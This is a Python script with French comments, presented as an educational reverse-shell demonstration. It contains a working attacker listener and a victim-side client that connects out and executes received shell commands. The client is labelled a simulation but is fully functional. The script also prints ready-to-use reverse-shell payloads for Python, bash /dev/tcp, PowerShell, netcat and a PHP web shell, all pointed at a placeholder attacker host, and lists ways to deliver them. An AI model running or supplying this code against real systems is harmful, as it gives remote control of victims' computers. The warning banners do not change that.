#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║              REVERSE SHELL - DÉMONSTRATION ÉDUCATIVE             ║
║                                                                  ║
║  ⚠️  USAGE ÉDUCATIF - NE PAS UTILISER SUR DES SYSTÈMES RÉELS ⚠️  ║
╚══════════════════════════════════════════════════════════════════╝

Un reverse shell permet à un attaquant de prendre le contrôle
d'un ordinateur à distance. La victime se connecte à l'attaquant.
"""

import socket
import subprocess
import threading
import os
import sys
from datetime import datetime

def start_listener(host='0.0.0.0', port=4444):
    """Démarrer un listener (côté attaquant)"""
    print(f"""
╔══════════════════════════════════════════════════════════════════╗
║              🎧 LISTENER - CÔTÉ ATTAQUANT                        ║
╠══════════════════════════════════════════════════════════════════╣
║  En attente d'une connexion sur {host}:{port}                     
╚══════════════════════════════════════════════════════════════════╝
    """)
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind((host, port))
        server.listen(1)
        print(f"🎧 Listener actif sur {host}:{port}")
        print("   En attente d'une victime...\n")
        
        client, addr = server.accept()
        print(f"\n🎉 CONNEXION REÇUE!")
        print(f"   IP Victime: {addr[0]}")
        print(f"   Port: {addr[1]}")
        print("-" * 50)
        print("📋 Vous avez maintenant accès au shell de la victime!")
        print("   Tapez 'exit' pour quitter")
        print("-" * 50 + "\n")
        
        while True:
            command = input(f"[{addr[0]}]$ ").strip()
            
            if command.lower() == 'exit':
                client.send(b'exit')
                break
            
            if not command:
                continue
            
            client.send(command.encode())
            
            response = client.recv(65535).decode('utf-8', errors='ignore')
            print(response)
        
        client.close()
        server.close()
        print("\n🔌 Connexion fermée.")
        
    except OSError as e:
        print(f"❌ Erreur: {e}")
        print("   Le port est peut-être déjà utilisé.")

def reverse_shell_client(attacker_ip, attacker_port=4444):
    """Client reverse shell (côté victime) - SIMULATION SEULEMENT"""
    print(f"""
╔══════════════════════════════════════════════════════════════════╗
║              💀 REVERSE SHELL CLIENT - SIMULATION                ║
╠══════════════════════════════════════════════════════════════════╣
║  Ceci simule ce qui se passe sur l'ordinateur de la victime      ║
║  quand elle exécute un fichier malveillant.                      ║
╚══════════════════════════════════════════════════════════════════╝
    """)
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((attacker_ip, attacker_port))
        print(f"✅ Connecté à l'attaquant: {attacker_ip}:{attacker_port}")
        print("   L'attaquant a maintenant le contrôle...\n")
        
        while True:
            command = sock.recv(1024).decode()
            
            if command.lower() == 'exit':
                break
            
            # Exécuter la commande
            try:
                output = subprocess.check_output(
                    command,
                    shell=True,
                    stderr=subprocess.STDOUT,
                    timeout=30
                )
                sock.send(output)
            except subprocess.CalledProcessError as e:
                sock.send(f"Erreur: {e.output.decode()}".encode())
            except subprocess.TimeoutExpired:
                sock.send(b"Timeout - commande trop longue")
            except Exception as e:
                sock.send(f"Erreur: {str(e)}".encode())
        
        sock.close()
        
    except ConnectionRefusedError:
        print(f"❌ Impossible de se connecter à {attacker_ip}:{attacker_port}")
    except Exception as e:
        print(f"❌ Erreur: {e}")

def show_payload_examples():
    """Montrer des exemples de payloads (éducatif)"""
    print("""
╔══════════════════════════════════════════════════════════════════╗
║              📦 EXEMPLES DE PAYLOADS REVERSE SHELL               ║
╠══════════════════════════════════════════════════════════════════╣
║  Ces commandes sont utilisées par les hackers pour obtenir       ║
║  un accès à distance. NE PAS EXÉCUTER SUR DES CIBLES RÉELLES!   ║
╚══════════════════════════════════════════════════════════════════╝

🐍 PYTHON:
─────────────────────────────────────────────────────────────────
python -c 'import socket,subprocess,os;s=socket.socket();
s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
subprocess.call(["/bin/sh","-i"])'

🐚 BASH:
─────────────────────────────────────────────────────────────────
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

💎 POWERSHELL (Windows):
─────────────────────────────────────────────────────────────────
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()

🌐 NETCAT:
─────────────────────────────────────────────────────────────────
nc -e /bin/sh ATTACKER_IP 4444

📧 PHP (pour sites web piratés):
─────────────────────────────────────────────────────────────────
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'");?>

════════════════════════════════════════════════════════════════════

🎯 COMMENT LES HACKERS DÉPLOIENT CES PAYLOADS:

   1. 📧 Phishing - Fichier joint malveillant
   2. 🌐 Site web compromis - Injection de code
   3. 📱 App malveillante - APK modifié
   4. 💾 Clé USB infectée - Autorun
   5. 🔓 Exploitation de vulnérabilité

🛡️ COMMENT SE PROTÉGER:

   1. Ne pas ouvrir les pièces jointes suspectes
   2. Maintenir les logiciels à jour
   3. Utiliser un antivirus
   4. Firewall activé
   5. Ne pas télécharger de sources inconnues
    """)

def main():
    print("""
╔══════════════════════════════════════════════════════════════════╗
║              💀 REVERSE SHELL - DÉMONSTRATION                    ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                  ║
║  Un reverse shell donne un accès complet à un ordinateur.        ║
║  C'est l'une des techniques les plus dangereuses!                ║
║                                                                  ║
║  🔄 COMMENT ÇA MARCHE:                                           ║
║                                                                  ║
║  [ATTAQUANT]          [VICTIME]                                  ║
║       🎧                  💻                                     ║
║       │   ←── Connexion ──│  (La victime se connecte)            ║
║       │   ── Commandes ──→│                                      ║
║       │   ←── Résultats ──│                                      ║
║       │                   │                                      ║
║  L'attaquant écoute et la victime se connecte à lui!             ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝
    """)
    
    print("📋 OPTIONS:\n")
    print("   1. Démarrer un listener (côté attaquant)")
    print("   2. Voir des exemples de payloads")
    print("   3. Simulation complète (local)")
    print("   0. Quitter")
    
    choice = input("\n🎯 Votre choix: ").strip()
    
    if choice == "1":
        port = input("Port à écouter [4444]: ").strip()
        port = int(port) if port.isdigit() else 4444
        start_listener(port=port)
        
    elif choice == "2":
        show_payload_examples()
        
    elif choice == "3":
        print("\n🔄 SIMULATION LOCALE")
        print("   Ceci démontre le concept sur votre propre machine.\n")
        
        # Démarrer listener dans un thread
        print("1. Démarrage du listener...")
        listener_thread = threading.Thread(target=start_listener, args=('127.0.0.1', 4445))
        listener_thread.daemon = True
        listener_thread.start()
        
        import time
        time.sleep(1)
        
        print("2. Connexion du 'client victime'...")
        reverse_shell_client('127.0.0.1', 4445)

if __name__ == "__main__":
    main()
